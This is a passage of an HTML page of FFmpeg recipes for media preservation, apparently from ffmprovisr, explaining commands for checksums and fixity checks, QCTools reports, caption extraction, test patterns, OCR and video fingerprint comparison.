      <h3>Check FFV1 Version 3 fixity</h3>
      <p><code>ffmpeg -report -i <em>input_file</em> -f null -</code></p>
      <p>This decodes your video and displays any CRC checksum mismatches. These errors will display in your terminal like this: <code>[ffv1 @ 0x1b04660] CRC mismatch 350FBD8A!at 0.272000 seconds</code></p>
      <p>Frame CRCs are enabled by default in FFV1 Version 3.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-report</dt><dd>Dump full command line and console output to a file named <em>ffmpeg-YYYYMMDD-HHMMSS.log</em> in the current directory. It also implies <code>-loglevel verbose</code>.</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-f null</dt><dd>Video is decoded with the <code>null</code> muxer. This allows video decoding without creating an output file.</dd>
        <dt>-</dt><dd>FFmpeg syntax requires a specified output, and <code>-</code> is just a place holder. No file is actually created.</dd>
      </dl>
      
    </div>
    <!-- ends Check FFV1 Fixity -->

    <!-- Create frame md5s -->
    <p><label for="create_frame_md5s_v">Create MD5 checksums (video frames)</label>
    </p><div>
      <h5>Create MD5 checksums (video frames)</h5>
      <p><code>ffmpeg -i <em>input_file</em> -f framemd5 -an <em>output_file</em></code></p>
      <p>This will create an MD5 checksum per video frame.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-f framemd5</dt><dd>library used to calculate the MD5 checksums</dd>
        <dt>-an</dt><dd>ignores the audio stream (audio no)</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>You may verify an MD5 checksum file created this way by using a <a href="https://amiaopensource.github.io/ffmprovisr/scripts/check_video_framemd5.sh" target="_blank">Bash script</a>.</p>
      
    </div>
    <!-- ends Create frame md5s -->

    <!-- Create frame md5s (audio) -->
    <p><label for="create_frame_md5s_a">Create MD5 checksums (audio samples)</label>
    </p><div>
      <h5>Create MD5 checksums (audio samples)</h5>
      <p><code>ffmpeg -i <em>input_file</em> -af "asetnsamples=n=48000" -f framemd5 -vn <em>output_file</em></code></p>
      <p>This will create an MD5 checksum for each group of 48000 audio samples.<br>
        The number of samples per group can be set arbitrarily, but it's good practice to match the samplerate of the media file (so you will get one checksum per second).</p>
      <p>Examples for other samplerates:</p>
      <ul>
        <li>44.1 kHz: "asetnsamples=n=44100"</li>
        <li>96 kHz: "asetnsamples=n=96000"</li>
      </ul>
      <p><strong>Note:</strong> This filter transcodes audio to 16 bit PCM by default. The generated framemd5s will represent this value. Validating these framemd5s will require using the same default settings. Alternatively, when your file has another quantization rates (e.g. 24 bit), then you might add the audio codec <code>-c:a pcm_s24le</code> to the command, for compatibility reasons with other tools, like <a href="https://mediaarea.net/BWFMetaEdit" target="_blank">BWF MetaEdit</a>.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-af "asetnsamples=n=<em>48000</em>"</dt><dd>the audio filter sets the sampling rate</dd>
        <dt>-f framemd5</dt><dd>library used to calculate the MD5 checksums</dd>
        <dt>-vn</dt><dd>ignores the video stream (video no)</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      <p>You may verify an MD5 checksum file created this way by using a <a href="https://amiaopensource.github.io/ffmprovisr/scripts/check_audio_framemd5.sh" target="_blank">Bash script</a>.</p>
      
    </div>
    <!-- ends Create frame md5s (audio) -->

    <!-- Create stream md5s -->
    <p><label for="create_stream_md5s">Create MD5 checksum(s) for A/V stream data only</label>
    </p><div>
      <h5>Create stream MD5s</h5>
      <p><code>ffmpeg -i <em>input_file</em> -map 0:v:0 -c:v copy -f md5 <em>output_file_1</em> -map 0:a:0 -c:a copy -f md5 <em>output_file_2</em></code></p>
      <p>This will create MD5 checksums for the first video and the first audio stream in a file. If only one of these is necessary (for example if used on a WAV file) either part of the command can be excluded to create the desired MD5 only. Use of this kind of checksum enables integrity of the A/V information to be verified independently of any changes to surrounding metadata.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-map 0:v:0</dt><dd>selects the first video stream from the input</dd>
        <dt>-c:v copy</dt><dd>ensures that FFmpeg will not transcode the video to a different codec before generating the MD5</dd>
        <dt><em>output_file_1</em></dt><dd>is the output file for the video stream MD5. Example file extensions are <code>.md5</code> and <code>.txt</code></dd>
        <dt>-map 0:a:0</dt><dd>selects the first audio stream from the input</dd>
        <dt>-c:a copy</dt><dd>ensures that FFmpeg will not transcode the audio to a different codec before generating the MD5 (by default FFmpeg will use 16 bit PCM for audio MD5s).</dd>
        <dt><em>output_file_2</em></dt><dd>is the output file for the audio stream MD5.</dd>
      </dl>
      <p><strong>Note:</strong> The MD5s generated by running this command on WAV files are compatible with those embedded by the <a href="https://mediaarea.net/BWFMetaEdit" target="_blank">BWF MetaEdit</a> tool and can be compared.</p>
      
    </div>
    <!-- ends Create stream md5s -->

    <!-- Get checksum for video/audio stream -->
    <p><label for="get_stream_checksum">Get checksum for video/audio stream</label>
    </p><div>
      <h5>Get checksum for video/audio stream</h5>
      <p><code>ffmpeg -loglevel error -i <em>input_file</em> -map 0:v:0 -f hash -hash md5 -</code></p>
      <p>This script will perform a fixity check on a specified audio or video stream of the file, useful for checking that the content within a video has not changed even if the container format has changed.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-loglevel error</dt><dd>sets the verbosity of logging to show all errors</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-map 0:v:0</dt><dd>designated the first video stream as the stream on which to perform this hash generation operation. <code>-map 0</code> can be used to run the operation on all streams.</dd>
        <dt>-f hash -hash md5</dt><dd>produce a checksum hash, and set the hash algorithm to md5. See the official <a href="https://ffmpeg.org/ffmpeg-formats.html#hash" target="_blank">documentation on hash</a> for other algorithms.</dd>
        <dt>-</dt><dd>FFmpeg syntax requires a specified output, and <code>-</code> is just a place holder. No file is actually created.</dd>
      </dl>
      
    </div>
    <!-- ends Get checksum for video/audio stream -->

    <!-- Get checksum for all video/audio streams -->
    <p><label for="get_streamhash">Get individual checksums for all video/audio streams ("Streamhash")</label>
    </p><div>
      <h5>Get individual checksums for all video/audio streams ("Streamhash")</h5>
      <p><code>ffmpeg -i <em>input_file</em> -map 0 -f streamhash -hash md5 - -v quiet</code></p>
      <p>The outcome is very similar to that of "-f hash", except you get one hash per-stream, instead of one (summary) hash. Another benefit is that you don't have to know which streams, or how many to expect in the source file. This is very handy for hashing mixed born-digital material.</p>
      <p>This script will perform a fixity check on all audio and video streams in the file and return one hashcode for each one.  This is useful for e.g. being able to change to container/codec format later on and validate it matches the original source.</p>
      <p>The output is formatted for easily processing it further in any kind of programming/scripting language.</p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-map 0</dt><dd>map ALL streams from input file to output. If you omit this, ffmpeg chooses only the first "best" (*) stream: 1 for audio, 1 for video (not all streams).</dd>
        <dt>-f streamhash -hash md5</dt><dd>produce a checksum hash per-stream, and set the hash algorithm to md5. See the official <a href="https://www.ffmpeg.org/ffmpeg-formats.html#streamhash-1" target="_blank">documentation on streamhash</a> for other algorithms and more details.</dd>
        <dt>-</dt><dd>FFmpeg syntax requires a specified output, and <code>-</code> is just a place holder. No file is actually created. Choose an output filename to write the hashcode lines into a textfile.</dd>
        <dt>-v quiet</dt><dd>(Optional) Disables FFmpeg's processing output. With this option it's easier to see the text output of the hashes.</dd>
      </dl>
      <p>The output looks like this, for example (1 video, 2 audio streams):
      <code>
      0,v,MD5=89bed8031048d985b48550b6b4cb171c<br>
      0,a,MD5=36daadb543b63610f63f9dcff11680fb<br>
      1,a,MD5=f21269116a847f887710cfc67ecc3e6e
      </code></p>
      
    </div>
    <!-- ends Get checksum for all video/audio streams -->

    <!-- QCTools Report -->
    <p><label for="qctools">QCTools report (with audio)</label>
    </p><div>
      <h5>Creates a QCTools report</h5>
      <p><code>ffprobe -f lavfi -i "movie=<em>input_file</em>:s=v+a[in0][in1], [in0]signalstats=stat=tout+vrep+brng, cropdetect=reset=1:round=1, idet=half_life=1, split[a][b];[a]field=top[a1];[b]field=bottom, split[b1][b2];[a1][b1]psnr[c1];[c1][b2]ssim[out0];[in1]ebur128=metadata=1, astats=metadata=1:reset=1:length=0.4[out1]" -show_frames -show_versions -of xml=x=1:q=1 -noprivate | gzip &gt; <em>input_file</em>.qctools.xml.gz</code></p>
      <p>This will create an XML report for use in <a href="https://github.com/bavc/qctools" target="_blank">QCTools</a> for a video file with one video track and one audio track. See also the <a href="https://github.com/bavc/qctools/blob/master/docs/data_format.md#creating-a-qctools-document" target="_blank">QCTools documentation</a>.</p>
      <dl>
        <dt>ffprobe</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells ffprobe to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter</a> input virtual device</dd>
        <dt>-i</dt><dd>input file and parameters</dd>
        <dt>"movie=<em>input_file</em>:s=v+a[in0][in1], [in0]signalstats=stat=tout+vrep+brng, cropdetect=reset=1:round=1, idet=half_life=1, split[a][b];[a]field=top[a1];[b]field=bottom, split[b1][b2];[a1][b1]psnr[c1];[c1][b2]ssim[out0];[in1]ebur128=metadata=1, astats=metadata=1:reset=1:length=0.4[out1]"</dt>
        <dd>This very large lump of commands declares the input file and passes in a request for all potential data signal information for a file with one video and one audio track</dd>
        <dt>-show_frames</dt><dd>asks for information about each frame and subtitle contained in the input multimedia stream</dd>
        <dt>-show_versions</dt><dd>asks for information related to program and library versions</dd>
        <dt>-of xml=x=1:q=1</dt><dd>sets the data export format to XML</dd>
        <dt>-noprivate</dt><dd>hides any private data that might exist in the file</dd>
        <dt>| gzip</dt><dd>The | is to "pipe" (or push) the data into a compressed file format</dd>
        <dt><code>&gt;</code></dt><dd>redirects the standard output (the data made by ffprobe about the video)</dd>
        <dt><em>input_file</em>.qctools.xml.gz</dt><dd>names the zipped data output file, which can be named anything but needs the extension qctools.xml.gz for compatibility issues</dd>
      </dl>
      
    </div>
    <!-- ends QCTools Report -->

    <!-- QCTools Report (no audio) -->
    <p><label for="qctools_no_audio">QCTools report (no audio)</label>
    </p><div>
      <h5>Creates a QCTools report</h5>
      <p><code>ffprobe -f lavfi -i "movie=<em>input_file</em>,signalstats=stat=tout+vrep+brng, cropdetect=reset=1:round=1, idet=half_life=1, split[a][b];[a]field=top[a1];[b]field=bottom,split[b1][b2];[a1][b1]psnr[c1];[c1][b2]ssim" -show_frames -show_versions -of xml=x=1:q=1 -noprivate | gzip &gt; <em>input_file</em>.qctools.xml.gz</code></p>
      <p>This will create an XML report for use in <a href="https://github.com/bavc/qctools" target="_blank">QCTools</a> for a video file with one video track and NO audio track. See also the <a href="https://github.com/bavc/qctools/blob/master/docs/data_format.md#creating-a-qctools-document" target="_blank">QCTools documentation</a>.</p>
      <dl>
        <dt>ffprobe</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells ffprobe to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter</a> input virtual device</dd>
        <dt>-i</dt><dd>input file and parameters</dd>
        <dt>"movie=<em>input_file</em>,signalstats=stat=tout+vrep+brng, cropdetect=reset=1:round=1, idet=half_life=1, split[a][b];[a]field=top[a1];[b]field=bottom,split[b1][b2];[a1][b1]psnr[c1];[c1][b2]ssim"</dt>
        <dd>This very large lump of commands declares the input file and passes in a request for all potential data signal information for a file with one video and one audio track</dd>
        <dt>-show_frames</dt><dd>asks for information about each frame and subtitle contained in the input multimedia stream</dd>
        <dt>-show_versions</dt><dd>asks for information related to program and library versions</dd>
        <dt>-of xml=x=1:q=1</dt><dd>sets the data export format to XML</dd>
        <dt>-noprivate</dt><dd>hides any private data that might exist in the file</dd>
        <dt>| gzip</dt><dd>The | is to "pipe" (or push) the data into a compressed file format</dd>
        <dt><code>&gt;</code></dt><dd>redirects the standard output (the data made by ffprobe about the video)</dd>
        <dt><em>input_file</em>.qctools.xml.gz</dt><dd>names the zipped data output file, which can be named anything but needs the extension qctools.xml.gz for compatibility issues</dd>
      </dl>
      
    </div>
    <!-- ends QCTools Report (no audio) -->

    <!-- Read/Extract EIA-608 Closed Captions -->
    <p><label for="readeia608">Read/Extract EIA-608 Closed Captioning</label>
    </p><div>
      <h5>Read/Extract EIA-608 (Line 21) closed captioning</h5>
      <p><code>ffprobe -f lavfi -i movie=<em>input_file</em>,readeia608 -show_entries frame=pkt_pts_time:frame_tags=lavfi.readeia608.0.line,lavfi.readeia608.0.cc,lavfi.readeia608.1.line,lavfi.readeia608.1.cc -of csv &gt; <em>input_file</em>.csv</code></p>
      <p>This command uses FFmpeg's <a href="https://ffmpeg.org/ffmpeg-filters.html#readeia608" target="_blank">readeia608</a> filter to extract the hexadecimal values hidden within <a href="https://en.wikipedia.org/wiki/EIA-608" target="_blank">EIA-608 (Line 21)</a> Closed Captioning, outputting a csv file. For more information about EIA-608, check out Adobe's <a href="https://www.adobe.com/content/dam/Adobe/en/devnet/video/pdfs/introduction_to_closed_captions.pdf" target="_blank">Introduction to Closed Captions</a>.</p>
      <p>If hex isn't your thing, closed captioning <a href="http://www.theneitherworld.com/mcpoodle/SCC_TOOLS/DOCS/CC_CHARS.HTML" target="_blank">character</a> and <a href="http://www.theneitherworld.com/mcpoodle/SCC_TOOLS/DOCS/CC_CODES.HTML" target="_blank">code</a> sets can be found in the documentation for SCTools.</p>
      <dl>
        <dt>ffprobe</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells ffprobe to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">libavfilter</a> input virtual device</dd>
        <dt>-i <em>input_file</em></dt><dd>input file and parameters</dd>
        <dt>readeia608 -show_entries frame=pkt_pts_time:frame_tags=lavfi.readeia608.0.line,lavfi.readeia608.0.cc,lavfi.readeia608.1.line,lavfi.readeia608.1.cc -of csv</dt><dd>specifies the first two lines of video in which EIA-608 data (hexadecimal byte pairs) are identifiable by ffprobe, outputting comma separated values (CSV)</dd>
        <dt>&gt;</dt><dd>redirects the standard output (the data created by ffprobe about the video)</dd>
        <dt><em>output_file</em>.csv</dt><dd>names the CSV output file</dd>
      </dl>
      <div>
        <h4>Example</h4>
        <p>Side-by-side video with true EIA-608 captions on the left, zoomed in view of the captions on the right (with hex values represented). To achieve something similar with your own captioned video, try out the EIA608/VITC viewer in <a href="https://github.com/bavc/qctools" target="_blank">QCTools</a>.</p>
        <p><img src="https://amiaopensource.github.io/ffmprovisr/img/eia608_captions.gif" alt="GIF of Closed Captions">
      </p></div>
      
    </div>
    <!-- ends Read/Extract EIA-608 Closed Captions -->

    </div>
    <div>
    <h2 id="test-files">Generate test files</h2>

    <!-- Mandelbrot -->
    <p><label for="mandelbrot">Make a mandelbrot test pattern video</label>
    </p><div>
      <h5>Makes a mandelbrot test pattern video</h5>
      <p><code>ffmpeg -f lavfi -i mandelbrot=size=1280x720:rate=25 -c:v libx264 -t 10 <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells FFmpeg to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter</a> input virtual device</dd>
        <dt>-i mandelbrot=size=1280x720:rate=25</dt><dd>asks for the <a href="https://ffmpeg.org/ffmpeg-filters.html#mandelbrot" target="_blank">mandelbrot test filter</a> as input. Adjusting the <code>size</code> and <code>rate</code> options allows you to choose a specific frame size and framerate.</dd>
        <dt>-c:v libx264</dt><dd>transcodes video from rawvideo to H.264. Set <code>-pix_fmt</code> to <code>yuv420p</code> for greater H.264 compatibility with media players.</dd>
        <dt>-t 10</dt><dd>specifies recording time of 10 seconds</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file. Try different file extensions such as mkv, mov, mp4, or avi.</dd>
      </dl>
      
    </div>
    <!-- ends Mandelbrot -->

    <!-- SMPTE bars -->
    <p><label for="smpte_bars">Make a SMPTE bars test pattern video</label>
    </p><div>
      <h3>Makes a SMPTE bars test pattern video</h3>
      <p><code>ffmpeg -f lavfi -i smptebars=size=720x576:rate=25 -c:v prores -t 10 <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells FFmpeg to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter</a> input virtual device</dd>
        <dt>-i smptebars=size=720x576:rate=25</dt><dd>asks for the <a href="https://ffmpeg.org/ffmpeg-filters.html#allrgb_002c-allyuv_002c-color_002c-haldclutsrc_002c-nullsrc_002c-rgbtestsrc_002c-smptebars_002c-smptehdbars_002c-testsrc_002c-testsrc2_002c-yuvtestsrc" target="_blank">smptebars test filter</a> as input. Adjusting the <code>size</code> and <code>rate</code> options allows you to choose a specific frame size and framerate.</dd>
        <dt>-c:v prores</dt><dd>transcodes video from rawvideo to Apple ProRes 4:2:2.</dd>
        <dt>-t 10</dt><dd>specifies recording time of 10 seconds</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file. Try different file extensions such as mov or avi.</dd>
      </dl>
      
    </div>
    <!-- ends SMPTE bars -->

    <!-- Test pattern video -->
    <p><label for="test">Make a test pattern video</label>
    </p><div>
      <h5>Make a test pattern video</h5>
      <p><code>ffmpeg -f lavfi -i testsrc=size=720x576:rate=25 -c:v v210 -t 10 <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells FFmpeg to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">libavfilter</a> input virtual device</dd>
        <dt>-i testsrc=size=720x576:rate=25</dt><dd>asks for the testsrc filter pattern as input. Adjusting the <code>size</code> and <code>rate</code> options allows you to choose a specific frame size and framerate.<br>
          The different test patterns that can be generated are listed <a href="https://ffmpeg.org/ffmpeg-filters.html#allrgb_002c-allyuv_002c-color_002c-haldclutsrc_002c-nullsrc_002c-rgbtestsrc_002c-smptebars_002c-smptehdbars_002c-testsrc_002c-testsrc2_002c-yuvtestsrc" target="_blank">here</a>.</dd>
        <dt>-c:v v210</dt><dd>transcodes video from rawvideo to 10-bit Uncompressed Y′C<sub>B</sub>C<sub>R</sub> 4:2:2. Alter this setting to set your desired codec.</dd>
        <dt>-t 10</dt><dd>specifies recording time of 10 seconds</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file. Try different file extensions such as mkv, mov, mp4, or avi.</dd>
      </dl>
      
    </div>
    <!-- ends Test pattern video -->

    <!-- Play HD SMPTE bars -->
    <p><label for="play_hd_smpte">Play HD SMPTE bars</label>
    </p><div>
      <h5>Play HD SMPTE bars</h5>
      <p>Test an HD video projector by playing the SMPTE color bars pattern.</p>
      <p><code>ffplay -f lavfi -i smptehdbars=size=1920x1080</code></p>
      <dl>
        <dt>ffplay</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells ffplay to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter</a> input virtual device</dd>
        <dt>-i smptehdbars=size=1920x1080</dt><dd>asks for the <a href="https://ffmpeg.org/ffmpeg-filters.html#allrgb_002c-allyuv_002c-color_002c-haldclutsrc_002c-nullsrc_002c-rgbtestsrc_002c-smptebars_002c-smptehdbars_002c-testsrc_002c-testsrc2_002c-yuvtestsrc" target="_blank">smptehdbars filter pattern</a> as input and sets the HD resolution. This generates a color bars pattern, based on the SMPTE RP 219–2002.</dd>
      </dl>
      
    </div>
    <!-- ends Play HD SMPTE bars -->

    <!-- Play VGA SMPTE bars -->
    <p><label for="play_vga_smpte">Play VGA SMPTE bars</label>
    </p><div>
      <h5>Play VGA SMPTE bars</h5>
      <p>Test a VGA (SD) video projector by playing the SMPTE color bars pattern.</p>
      <p><code>ffplay -f lavfi -i smptebars=size=640x480</code></p>
      <dl>
        <dt>ffplay</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells ffplay to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter</a> input virtual device</dd>
        <dt>-i smptebars=size=640x480</dt><dd>asks for the <a href="https://ffmpeg.org/ffmpeg-filters.html#allrgb_002c-allyuv_002c-color_002c-haldclutsrc_002c-nullsrc_002c-rgbtestsrc_002c-smptebars_002c-smptehdbars_002c-testsrc_002c-testsrc2_002c-yuvtestsrc" target="_blank">smptebars filter pattern</a> as input and sets the VGA (SD) resolution. This generates a color bars pattern, based on the SMPTE Engineering Guideline EG 1–1990.</dd>
      </dl>
      
    </div>
    <!-- ends Play VGA SMPTE bars -->

    <!-- Sine wave -->
    <p><label for="sine_wave">Generate a sine wave test audio file</label>
    </p><div>
      <h5>Sine wave</h5>
      <p>Generate a test audio file playing a sine wave.</p>
      <p><code>ffmpeg -f lavfi -i "sine=frequency=1000:sample_rate=48000:duration=5" -c:a pcm_s16le <em>output_file</em>.wav</code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells FFmpeg to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter</a> input virtual device</dd>
        <dt>-i "sine=frequency=1000:sample_rate=48000:duration=5"</dt><dd>Sets the signal to 1000 Hz, sampling at 48 kHz, and for 5 seconds</dd>
        <dt>-c:a pcm_s16le</dt><dd>encodes the audio codec in <code>pcm_s16le</code> (the default encoding for wav files). <code>pcm</code> represents pulse-code modulation format (raw bytes), <code>16</code> means 16 bits per sample, and <code>le</code> means "little endian"</dd>
        <dt><em>output_file</em>.wav</dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Sine wave -->

    <!-- SMPTE bars + Sine wave -->
    <p><label for="smpte_bars_and_sine_wave">SMPTE bars + Sine wave audio</label>
    </p><div>
      <h5>SMPTE bars + Sine wave audio</h5>
      <p>Generate a SMPTE bars test video + a 1kHz sine wave as audio testsignal.</p>
      <p><code>ffmpeg -f lavfi -i "smptebars=size=720x576:rate=25" -f lavfi -i "sine=frequency=1000:sample_rate=48000" -c:a pcm_s16le -t 10 -c:v ffv1 <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells FFmpeg to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">libavfilter</a> input virtual device</dd>
        <dt>-i smptebars=size=720x576:rate=25</dt><dd>asks for the <a href="https://ffmpeg.org/ffmpeg-filters.html#allrgb_002c-allyuv_002c-color_002c-haldclutsrc_002c-nullsrc_002c-rgbtestsrc_002c-smptebars_002c-smptehdbars_002c-testsrc_002c-testsrc2_002c-yuvtestsrc" target="_blank">smptebars test filter</a> as input. Adjusting the <code>size</code> and <code>rate</code> options allows you to choose a specific frame size and framerate.</dd>
        <dt>-f lavfi</dt><dd>use libavfilter again, but now for audio</dd>
        <dt>-i "sine=frequency=1000:sample_rate=48000"</dt><dd>Sets the signal to 1000 Hz, sampling at 48 kHz.</dd>
        <dt>-c:a pcm_s16le</dt><dd>encodes the audio codec in <code>pcm_s16le</code> (the default encoding for wav files). <code>pcm</code> represents pulse-code modulation format (raw bytes), <code>16</code> means 16 bits per sample, and <code>le</code> means "little endian"</dd>
        <dt>-t 10</dt><dd>specifies recording time of 10 seconds</dd>
        <dt>-c:v ffv1</dt><dd>Encodes to <a href="https://en.wikipedia.org/wiki/FFV1" target="_blank">FFV1</a>. Alter this setting to set your desired codec.</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends SMPTE bars + Sine wave -->

    <!-- Broken File -->
    <p><label for="broken_file">Make a broken file</label>
    </p><div>
      <h5>Makes a broken test file</h5>
      <p>Modifies an existing, functioning file and intentionally breaks it for testing purposes.</p>
      <p><code>ffmpeg -i <em>input_file</em> -bsf noise=1 -c copy <em>output_file</em></code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_file</em></dt><dd>takes in a normal file</dd>
        <dt>-bsf noise=1</dt><dd>sets bitstream filters for all to 'noise'. Filters can be set on specific filters using syntax such as <code>-bsf:v</code> for video, <code>-bsf:a</code> for audio, etc. The <a href="https://ffmpeg.org/ffmpeg-bitstream-filters.html#noise" target="_blank">noise filter</a> intentionally damages the contents of packets without damaging the container. This sets the noise level to 1 but it could be left blank or any number above 0.</dd>
        <dt>-c copy</dt><dd>use stream copy mode to re-mux instead of re-encode</dd>
        <dt><em>output_file</em></dt><dd>path, name and extension of the output file</dd>
      </dl>
      
    </div>
    <!-- ends Broken File -->

    <!-- Game of Life -->
    <p><label for="game_of_life">Conway's Game of Life</label>
    </p><div>
      <h5>Conway's Game of Life</h5>
      <p>Simulates <a href="https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life" target="_blank">Conway's Game of Life</a></p>
      <p><code>ffplay -f lavfi life=s=300x200:mold=10:r=60:ratio=0.1:death_color=#c83232:life_color=#00ff00,scale=1200:800</code></p>
      <dl>
        <dt>ffplay</dt><dd>starts the command</dd>
        <dt>-f lavfi</dt><dd>tells ffplay to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter</a> input virtual device</dd>
        <dt>life=s=300x200</dt><dd>use the life filter and set the size of the video to 300x200</dd>
        <dt>:</dt><dd>indicates there’s another parameter coming</dd>
        <dt>mold=10:r=60:ratio=0.1</dt><dd>sets up the rules of the game: cell mold speed, video rate, and random fill ratio</dd>
        <dt>:</dt><dd>indicates there’s another parameter coming</dd>
        <dt>death_color=#c83232:life_color=#00ff00</dt><dd>specifies color for cell death and cell life; mold_color can also be set</dd>
        <dt>,</dt><dd>comma signifies closing of video source assertion and ready for filter assertion</dd>
        <dt>scale=1200:800</dt><dd>scale to 1280 width and 800 height</dd>
      </dl>
      <p><img src="https://amiaopensource.github.io/ffmprovisr/img/life.gif" alt="GIF of above command"></p><p>To save a portion of the stream instead of playing it back infinitely, use the following command:</p>
      <p><code>ffmpeg -f lavfi -i life=s=300x200:mold=10:r=60:ratio=0.1:death_color=#c83232:life_color=#00ff00,scale=1200:800 -t 5 <em>output_file</em></code></p>
      
    </div>
    <!-- ends Game of Life -->

    </div>
    <div>
    <h2 id="ocr">Use OCR</h2>

    <!-- Show OCR -->
    <p><label for="ocr_on_top">Play video with OCR</label>
    </p><div>
      <h5>Plays video with OCR on top</h5>
      <p><code>ffplay input_file -vf "ocr,drawtext=fontfile=/Library/Fonts/Andale Mono.ttf:text=%{metadata\\\:lavfi.ocr.text}:fontcolor=white"</code></p>
      <dl>
        <dt>ffplay</dt><dd>starts the command</dd>
        <dt><em>input_file</em></dt><dd>path, name and extension of the input file</dd>
        <dt>-vf</dt><dd>creates a filtergraph to use for the streams</dd>
        <dt>"</dt><dd>quotation mark to start filtergraph</dd>
        <dt>ocr,</dt><dd>tells ffplay to use ocr as source and the comma signifies that the script is ready for filter assertion</dd>
        <dt>drawtext=fontfile=/Library/Fonts/Andale Mono.ttf</dt><dd>tells ffplay to drawtext and use a specific font (Andale Mono) when doing so</dd>
        <dt>:</dt><dd>indicates there’s another parameter coming</dd>
        <dt>text=%{metadata\\\:lavfi.ocr.text}</dt><dd>tells ffplay what text to use when playing. In this case, calls for metadata that lives in the lavfi.ocr.text library</dd>
        <dt>:</dt><dd>indicates there’s another parameter coming</dd>
        <dt>fontcolor=white</dt><dd>specifies font color as white</dd>
        <dt>"</dt><dd>quotation mark to end filtergraph</dd>
      </dl>
      
    </div>
    <!-- ends Show OCR -->

    <!-- Export OCR -->
    <p><label for="ffprobe_ocr">Export OCR from video to screen</label>
    </p><div>
      <h5>Exports OCR data to screen</h5>
      <p><code>ffprobe -show_entries frame_tags=lavfi.ocr.text -f lavfi -i "movie=<em>input_file</em>,ocr"</code></p>
      <dl>
        <dt>ffprobe</dt><dd>starts the command</dd>
        <dt>-show_entries</dt><dd>sets a list of entries to show</dd>
        <dt>frame_tags=lavfi.ocr.text</dt><dd>shows the <em>lavfi.ocr.text</em> tag in the frame section of the video</dd>
        <dt>-f lavfi</dt><dd>tells ffprobe to use the <a href="https://ffmpeg.org/ffmpeg-devices.html#lavfi" target="_blank">Libavfilter input virtual device</a></dd>
        <dt>-i "movie=<em>input_file</em>,ocr"</dt><dd>declares 'movie' as <em>input_file</em> and passes in the 'ocr' command</dd>
      </dl>
      
    </div>
    <!-- ends Exports OCR -->

    </div>
    <div>
    <h2 id="perceptual-similarity">Compare perceptual similarity of videos</h2>

    <!-- Compare Video Fingerprints -->
    <p><label for="compare_video_fingerprints">Compare Video Fingerprints</label>
    </p><div>
      <h5>Compare two video files for content similarity using perceptual hashing</h5>
      <p><code>ffmpeg -i <em>input_one</em> -i <em>input_two</em> -filter_complex signature=detectmode=full:nb_inputs=2 -f null -</code></p>
      <dl>
        <dt>ffmpeg</dt><dd>starts the command</dd>
        <dt>-i <em>input_one</em> -i <em>input_two</em></dt><dd>assigns the input files</dd>
        <dt>-filter_complex</dt><dd>enables using more than one input file to the filter</dd>
        <dt>signature=detectmode=full</dt><dd>Applies the signature filter to the inputs in 'full' mode. The other option is 'fast'.</dd>
        <dt>nb_inputs=2</dt><dd>tells the filter to expect two input files</dd>
        <dt>-f null -</dt><dd>Sets the output of FFmpeg to a null stream (since we are not creating a transcoded file, just viewing metadata).</dd>
      </dl>
      
    </div>
    <!-- ends Compare Video Fingerprints -->

